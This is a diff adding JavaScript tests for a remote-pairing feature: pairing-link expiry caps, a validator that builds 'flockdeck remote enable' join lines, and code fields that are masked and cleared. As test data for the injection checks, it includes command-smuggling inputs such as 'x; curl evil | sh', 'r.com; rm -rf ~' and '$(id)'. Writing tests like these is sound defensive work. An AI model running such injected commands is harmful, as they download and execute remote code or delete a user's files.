@@ -14,7 +14,7 @@ import { Live } from "../assets/shell/Live.js";
 import { Remote } from "../assets/shell/Remote.js";
 import { canClear, clearKeyCommand, keyNotes, keyStatus, keysOf, setKeyCommand } from "../assets/lib/apikeys.js";
 import {
-  ACCESS, accessIndex, ago, daysLeft, deviceCodes, enableCommand, leftText, moveCommand, outcomeOf, pairLive, pairOf, planOf, planText, qrSource, renameCommand,
+  ACCESS, accessIndex, ago, daysLeft, deviceCodes, enableCommand, joinLine, leftText, moveCommand, outcomeOf, PAIR_CAP_MS, pairLive, pairOf, planOf, planText, qrSource, renameCommand,
   retryClock, revokeCommand, roleCommand, rosterOf, summaryOf, unverifyCommand, untilText, verifyCommand, viewOf,
 } from "../assets/lib/remote.js";
 import {
@@ -122,7 +122,7 @@ test("remote: a pairing link is live until it expires, and says how long it has"
   assert.equal(pairLive(p, now), true);
   assert.equal(pairLive(p, now + 125000), false, "at the moment it ends");
   assert.equal(pairLive({ ...p, expiresAt: "" }, now), true, "no expiry is taken as live");
-  assert.equal(pairLive({ ...p, url: "" }, now), false);
+  assert.equal(pairLive({ ...p, url: "", code: "" }, now), false);
   assert.equal(pairLive(null, now), false);
   assert.equal(leftText(p.expiresAt, now), "2 minutes 5 seconds left");
   assert.equal(leftText(p.expiresAt, now + 64000), "1 minute 1 second left");
@@ -1013,6 +1013,88 @@ test("Remote: a request that could not be sent is said, and not shown as waiting
     r.container.find("#remote-pair").click();
     await settle();
     assert.match(r.container.find("#remote-pair").textContent, /Pair a device/, "still the same button, not Asking the relay");
+  } finally {
+    r.done();
+  }
+});
+
+test("remote: a link or code with no expiry is shown for ten minutes from arrival, and a join line is built only from plain text", () => {
+  const now = Date.parse("2026-10-24T12:00:00Z");
+  const p = { url: "https://x/p/1", expiresAt: "", arrived: now };
+  assert.equal(PAIR_CAP_MS, 600000);
+  assert.equal(pairLive(p, now + PAIR_CAP_MS - 1), true);
+  assert.equal(pairLive(p, now + PAIR_CAP_MS), false);
+  assert.equal(pairLive({ code: "abc", expiresAt: "", arrived: now }, now + PAIR_CAP_MS), false, "a join code is held to it too");
+  assert.equal(pairLive({ code: "abc", expiresAt: new Date(now + 5000).toISOString(), arrived: now - PAIR_CAP_MS * 2 }, now), true, "its own expiry rules when it has one");
+  assert.equal(joinLine("https://remote.flockdeck.ai", "JOIN-42_x"), "flockdeck remote enable -relay https://remote.flockdeck.ai -join JOIN-42_x");
+  assert.equal(joinLine("relay.example.com:8443", "abc"), "flockdeck remote enable -relay relay.example.com:8443 -join abc");
+  assert.equal(joinLine("", "abc"), "flockdeck remote enable -join abc");
+  for (const code of ["x; curl evil | sh", "a b", "$(id)", "a`id`", "a\nb", ""]) assert.equal(joinLine("https://r", code), "", JSON.stringify(code));
+  for (const relay of ["r.com; rm -rf ~", "https://r.com/ -x", "r.com\n", "$(id).com", "http://"]) assert.equal(joinLine(relay, "abc"), "", JSON.stringify(relay));
+});
+
+test("Remote: an expired join code is taken away, a hostile one is never offered as a command, and the store lets go of both", async () => {
+  let t = Date.parse("2026-10-24T12:00:00Z");
+  let forgotten = 0;
+  const r = await direct({ tickMs: 10, pollMs: 30, clock: () => t, forget: () => { forgotten++; } });
+  try {
+    r.draw({ pair: { type: "remotePair", kind: "host", code: "JOIN-42", expiresAt: new Date(t + 3000).toISOString(), seq: 1 } });
+    await settle();
+    assert.match(r.container.find("#remote-join-text").textContent, /-join JOIN-42/);
+    t += 4000;
+    await settle(60);
+    assert.equal(r.container.find("#remote-join-text"), null, "no dead code is left to paste");
+    assert.match(r.container.find("#remote-join-expired").textContent, /That join code has expired/);
+    assert.ok(forgotten >= 1, "the store is told to drop it");
+    r.draw({ pair: { type: "remotePair", kind: "host", code: "x; curl evil | sh", expiresAt: new Date(t + 60000).toISOString(), seq: 2 } });
+    await settle();
+    assert.equal(r.container.find("#remote-join-text"), null);
+    assert.match(r.container.find("#remote-join-bad").textContent, /not plain text/);
+    assert.equal(r.container.textContent.includes("curl evil"), false, "it is not printed at all");
+    // No expiry at all: shown, then gone after the cap.
+    r.draw({ pair: { type: "remotePair", kind: "host", code: "abc", expiresAt: "", seq: 3 } });
+    await settle();
+    assert.ok(r.container.find("#remote-join-text"));
+    t += PAIR_CAP_MS + 1000;
+    await settle(60);
+    assert.equal(r.container.find("#remote-join-text"), null);
+  } finally {
+    r.done();
+  }
+  assert.ok(forgotten >= 2, "and when the dialog closes");
+});
+
+test("store: clearPair drops the last pairing answer, and the dialog closing does it", async () => {
+  const { store } = await harness();
+  store.start();
+  const ws = FakeWebSocket.last;
+  ws.open();
+  ws.frame(hello({}));
+  ws.frame({ type: "remotePair", kind: "device", url: "https://r/p/1", qr: "<svg/>", code: "123" });
+  assert.equal(store.getState().remotePair.url, "https://r/p/1");
+  store.clearPair();
+  assert.equal(store.getState().remotePair, null);
+  store.stop();
+});
+
+test("Remote: the join and invitation codes are password fields and are emptied once sent", async () => {
+  const r = await direct({ status: null, roster: { type: "remoteDevices", enabled: false, devices: [], seq: 1 } });
+  try {
+    await r.container.find("#remote-more").click();
+    await settle();
+    for (const id of ["#remote-join", "#remote-invite"]) assert.equal(r.container.find(id).attributes.type, "password", id);
+    for (const [id, v] of [["#remote-join", "J-1"], ["#remote-invite", "I-1"]]) {
+      const el = r.container.find(id);
+      el.value = v;
+      el.dispatch("input");
+    }
+    await settle();
+    r.sent.length = 0;
+    await r.container.find("#remote-enable").click();
+    await settle();
+    assert.equal(r.sent.length, 1);
+    assert.equal(r.container.find("#remote-join").attributes.value, "");
+    assert.equal(r.container.find("#remote-invite").attributes.value, "");
   } finally {
     r.done();
   }
